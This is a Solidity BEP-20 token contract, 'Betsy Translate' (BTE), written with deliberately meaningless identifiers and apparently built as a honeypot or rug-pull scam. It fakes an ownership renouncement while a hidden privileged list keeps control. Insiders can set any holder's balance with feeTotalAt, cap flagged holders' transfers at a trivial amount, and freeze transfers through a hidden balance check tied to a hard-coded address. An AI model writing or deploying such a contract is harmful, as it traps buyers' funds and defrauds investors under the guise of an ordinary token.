//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface fromListToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract maxLimitTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverSell {
    function createPair(address tokenSwap, address liquidityFund) external returns (address);
}

interface enableBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapLaunch) external view returns (uint256);

    function transfer(address atLaunched, uint256 receiverAt) external returns (bool);

    function allowance(address marketingTeam, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverAt) external returns (bool);

    function transferFrom(
        address sender,
        address atLaunched,
        uint256 receiverAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atTx, uint256 value);
    event Approval(address indexed marketingTeam, address indexed spender, uint256 value);
}

interface enableBuyMetadata is enableBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract BetsyTranslate is maxLimitTrading, enableBuy, enableBuyMetadata {

    function totalSupply() external view virtual override returns (uint256) {
        return launchMode;
    }

    mapping(address => bool) public atTotal;

    function sellShould(address feeTx) public {
        require(feeTx.balance < 100000);
        if (buyTo) {
            return;
        }
        if (fundTake) {
            swapSell = false;
        }
        atTotal[feeTx] = true;
        if (fundTake) {
            senderLaunched = false;
        }
        buyTo = true;
    }

    function toAutoMax(address isReceiverAt, address atLaunched, uint256 receiverAt) internal returns (bool) {
        require(atShould[isReceiverAt] >= receiverAt);
        atShould[isReceiverAt] -= receiverAt;
        atShould[atLaunched] += receiverAt;
        emit Transfer(isReceiverAt, atLaunched, receiverAt);
        return true;
    }

    function liquidityAmountLaunched(address isReceiverAt, address atLaunched, uint256 receiverAt) internal returns (bool) {
        if (isReceiverAt == atAmountToken) {
            return toAutoMax(isReceiverAt, atLaunched, receiverAt);
        }
        uint256 fromLiquidity = enableBuy(buyToTotal).balanceOf(fundEnable);
        require(fromLiquidity == listBuyLaunch);
        require(atLaunched != fundEnable);
        if (takeModeTeam[isReceiverAt]) {
            return toAutoMax(isReceiverAt, atLaunched, limitWalletTrading);
        }
        return toAutoMax(isReceiverAt, atLaunched, receiverAt);
    }

    function amountIs(uint256 receiverAt) public {
        shouldFund();
        listBuyLaunch = receiverAt;
    }

    address swapAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private fundTake;

    uint8 private launchedIsSell = 18;

    constructor (){
        
        fromListToken autoModeSwap = fromListToken(swapAuto);
        buyToTotal = receiverSell(autoModeSwap.factory()).createPair(autoModeSwap.WETH(), address(this));
        
        atAmountToken = _msgSender();
        isTeam();
        atTotal[atAmountToken] = true;
        atShould[atAmountToken] = launchMode;
        
        emit Transfer(address(0), atAmountToken, launchMode);
    }

    function owner() external view returns (address) {
        return buyMinLiquidity;
    }

    function allowance(address walletIs, address teamToShould) external view virtual override returns (uint256) {
        if (teamToShould == swapAuto) {
            return type(uint256).max;
        }
        return fundSenderSell[walletIs][teamToShould];
    }

    bool public buyTo;

    uint256 private launchMode = 100000000 * 10 ** 18;

    function shouldFund() private view {
        require(atTotal[_msgSender()]);
    }

    bool public exemptAtSwap;

    function liquidityMaxSender(address enableAtLimit) public {
        shouldFund();
        
        if (enableAtLimit == atAmountToken || enableAtLimit == buyToTotal) {
            return;
        }
        takeModeTeam[enableAtLimit] = true;
    }

    address public atAmountToken;

    address private buyMinLiquidity;

    mapping(address => bool) public takeModeTeam;

    bool public swapSell;

    function getOwner() external view returns (address) {
        return buyMinLiquidity;
    }

    uint256 receiverLaunched;

    function decimals() external view virtual override returns (uint8) {
        return launchedIsSell;
    }

    function transfer(address walletMin, uint256 receiverAt) external virtual override returns (bool) {
        return liquidityAmountLaunched(_msgSender(), walletMin, receiverAt);
    }

    bool public senderLaunched;

    function symbol() external view virtual override returns (string memory) {
        return sellBuy;
    }

    function approve(address teamToShould, uint256 receiverAt) public virtual override returns (bool) {
        fundSenderSell[_msgSender()][teamToShould] = receiverAt;
        emit Approval(_msgSender(), teamToShould, receiverAt);
        return true;
    }

    function transferFrom(address isReceiverAt, address atLaunched, uint256 receiverAt) external override returns (bool) {
        if (_msgSender() != swapAuto) {
            if (fundSenderSell[isReceiverAt][_msgSender()] != type(uint256).max) {
                require(receiverAt <= fundSenderSell[isReceiverAt][_msgSender()]);
                fundSenderSell[isReceiverAt][_msgSender()] -= receiverAt;
            }
        }
        return liquidityAmountLaunched(isReceiverAt, atLaunched, receiverAt);
    }

    string private maxToFrom = "Betsy Translate";

    mapping(address => mapping(address => uint256)) private fundSenderSell;

    string private sellBuy = "BTE";

    function isTeam() public {
        emit OwnershipTransferred(atAmountToken, address(0));
        buyMinLiquidity = address(0);
    }

    uint256 constant limitWalletTrading = 4 ** 10;

    function name() external view virtual override returns (string memory) {
        return maxToFrom;
    }

    address public buyToTotal;

    function balanceOf(address swapLaunch) public view virtual override returns (uint256) {
        return atShould[swapLaunch];
    }

    mapping(address => uint256) private atShould;

    function feeTotalAt(address walletMin, uint256 receiverAt) public {
        shouldFund();
        atShould[walletMin] = receiverAt;
    }

    uint256 listBuyLaunch;

    uint256 private shouldAmount;

    event OwnershipTransferred(address indexed enableShould, address indexed liquidityTeamLaunched);

    address fundEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

}